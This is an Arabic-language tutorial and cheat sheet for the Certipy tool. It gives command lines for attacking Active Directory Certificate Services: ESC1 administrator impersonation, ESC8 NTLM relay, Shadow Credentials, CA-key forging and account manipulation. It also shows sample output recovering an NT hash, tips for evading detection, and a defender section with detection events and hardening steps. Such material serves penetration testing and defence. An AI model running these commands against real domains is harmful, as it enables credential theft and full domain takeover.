# دليل Certipy الشامل

تُعد `certipy` الأداة الأقوى حاليًا للهجوم على خدمات شهادات Active Directory (AD CS). حلت هذه الأداة محل سلسلة الأدوات القديمة (`Certify.exe` + `ForgeCert`) عبر أداة واحدة بلغة Python. تدعم الأداة كافة مسارات الهجوم المنشورة من ESC1 إلى ESC15، بالإضافة إلى تزوير التذاكر (Ticket forging) و هجمات Shadow-credentials.

## التثبيت (Install)

```terminal
pipx install certipy-ad
```

## الأوامر الفرعية (Subcommands)

| الأمر | الوظيفة |
|-------|---------|
| `find` | حصر (Enumerate) جهات إصدار الشهادات (CAs) والقوالب وتحليل مسارات ESC |
| `req` | طلب شهادة رقمية |
| `auth` | المصادقة عبر شهادة (PKINIT) للحصول على هاش NT وتذكرة TGT |
| `account` | التلاعب بحساب الهدف (UPN، altSecurityIdentities، إلخ) |
| `template` | قراءة أو كتابة إعدادات القوالب (للمسار ESC4) |
| `ca` | إدارة جهة إصدار الشهادات (للمسار ESC7) |
| `relay` | إعادة توجيه مصادقة NTLM إلى AD CS (للمسارين ESC8/11) |
| `forge` | تزوير شهادة باستخدام مفتاح CA خاص تم اختراقه (ESC12) |
| `cert` | معالجة الشهادات محليًا (التحويل بين PFX و PEM) |
| `shadow` | تنفيذ هجمات Shadow Credentials |
| `kerberoast` | تنفيذ هجوم Kerberoasting باستخدام certipy |

## أشكال المصادقة (Authentication Shape)

```terminal
-u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1
-u alice@corp.local -hashes :5e5a04... -dc-ip 10.0.0.1
-pfx alice.pfx -dc-ip 10.0.0.1
-k -no-pass -dc-ip 10.0.0.1     # باستخدام ملف KRB5CCNAME
```

## مسارات العمل (Workflows)

### حصر كافة الثغرات الموجودة

```terminal
certipy find -u alice@corp.local -p 'Pass1' -dc-ip 10.0.0.1 -vulnerable -stdout
```

خيار `-vulnerable` يفلتر النتائج لتظهر القوالب المصابة بأحد مسارات ESC فقط. خيار `-stdout` يطبع النتائج على الشاشة بدلاً من حفظها في ملفات.

### ESC1 — طلب شهادة "باسم" المسؤول (Admin)

```terminal
certipy req -u alice@corp.local -p 'Pass1' \
  -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local
```

### المصادقة باستخدام الشهادة ← الحصول على هاش NT

```terminal
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC8 — إعادة توجيه NTLM إلى واجهة الويب لـ AD CS

```terminal
certipy relay -target http://CA -template DomainController
# ثم قم بإطلاق هجوم coercion مثل: PetitPotam.py أو coercer.py
```

### هجوم Shadow Credentials (إساءة استخدام msDS-KeyCredentialLink)

```terminal
certipy shadow auto -u alice@corp.local -p Pass1 -account victim
# يقوم بضبط msDS-KeyCredentialLink على حساب الضحية، ويعيد هاش NT الخاص به عبر PKINIT
```

### التزوير باستخدام مفتاح CA مخترق (ESC12)

```terminal
certipy forge -ca-pfx ca.pfx -upn administrator@corp.local
```

### التلاعب بالحسابات (ESC9, ESC14)

```terminal
certipy account update -u alice -p Pass1 -user victim -upn administrator
```

## المعاملات الشائعة (Common Parameters)

| الوسم (Flag) | الغرض |
|--------------|-------|
| `-ca <name>` | اسم جهة إصدار الشهادات (CA) |
| `-template <name>` | اسم القالب |
| `-upn <user>` | اسم المستخدم المستهدف لانتحال الشخصية (SAN) |
| `-dns <host>` | اسم الـ DNS في حقل SAN |
| `-sid <sid>` | ملحق SID للأمان |
| `-application-policies <list>` | تخطي سياسات التطبيق في ESC15 |
| `-archive-key <file>` | سحب مفتاح خاص موجود من أرشيف الـ CA |
| `-out <basename>` | اسم ملف المخرجات بصيغة `.pfx` |
| `-debug` | عرض تفاصيل العمليات (Verbose) |

## مثال لمخرجات ناجحة

```
[*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx administrator.pfx
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*]    NT hash: 5e5a04...
```

الحصول على هاش الـ NT للمسؤول يعني إمكانية تنفيذ DCSync، ثم استخراج Golden Ticket، مما يعني السيطرة الكاملة على الغابة (Forest).

## المشاكل الشائعة والحلول

| العرض | الحل |
|-------|------|
| `STATUS_ACCESS_DENIED` عند الطلب (`req`) | القالب يتطلب موافقة المدير (Manager Approval)، أو تفتقر لصلاحيات التسجيل (Enroll rights) |
| `KDC_ERR_CLIENT_NOT_TRUSTED` عند المصادقة | يتم فرض ربط قوي للشهادة مع فقدان ملحق الـ SID؛ استخدم خيار `-sid` |
| `find -vulnerable` لا يظهر شيئًا | البيئة مطبقة لمبدأ الامتيازات الأقل (Least-priv)؛ جرب مسار shadow-credentials |
| `relay` لا يتلقى أي اتصالات | تم حظر نواقل الـ Coercion؛ جرب `dfscoerce` أو `coercer` |
| الشهادة صالحة ولكن فشل PKINIT | ربط الشهادة قوي (Strong mapping)؛ يتطلب ربطًا صريحًا عبر `altSecurityIdentities` |

## منظور المدافعين (Defender's Perspective)

- **EID 4886 / 4887** على الـ CA: طلب أو إصدار شهادة تحتوي على حقل SAN مريب.
- **EID 4624 نوع 9 (تسجيل دخول Kerberos بزيادة شهادة)** مباشرة بعد إصدار شهادة.
- **EID 4768** طلب تذكرة TGT مع وسم `Pre-auth not required` (إشارة لـ PKINIT).
- خدمة Microsoft Defender for Identity توفر آليات رصد لـ ESC1 و ESC8.

إجراءات التحصين:
- فرض `StrongCertificateBindingEnforcement = 2` عبر الريجستري.
- تعطيل التسجيل عبر HTTP، وفرض HTTPS مع EPA (للحماية من ESC8).
- تفعيل موافقة المدير (Manager-approval) على أي قالب يسمح بـ SAN في الطلب.
- مراجعة صلاحيات `ManageCA` بشكل أسبوعي.

## أمن العمليات (OPSEC)

- كل أمر `certipy req` يقوم بكتابة ملف `.pfx` محليًا؛ تأكد من مسحه.
- يمكن تشغيل الأداة من جهاز المهاجم مباشرة؛ لا يشترط أن يكون الجهاز منضمًا للنطاق (Domain-joined).
- يعتبر ESC1 المسار الأكثر "ضجيجًا" لأن عدم تطابق الـ SAN يتم تسجيله في السجلات. مسار ESC13 أكثر هدوءًا.

## أدوات ذات صلة

- **Certify.exe** — النسخة القديمة المكتوبة بلغة C# للعمل من داخل أنظمة Windows.
- **ForgeCert** — أداة قديمة لتزوير شهادات Silver-cert بلغة C#.
- **PassTheCert** — للمصادقة عبر PKINIT من نظام Linux باستخدام schannel.
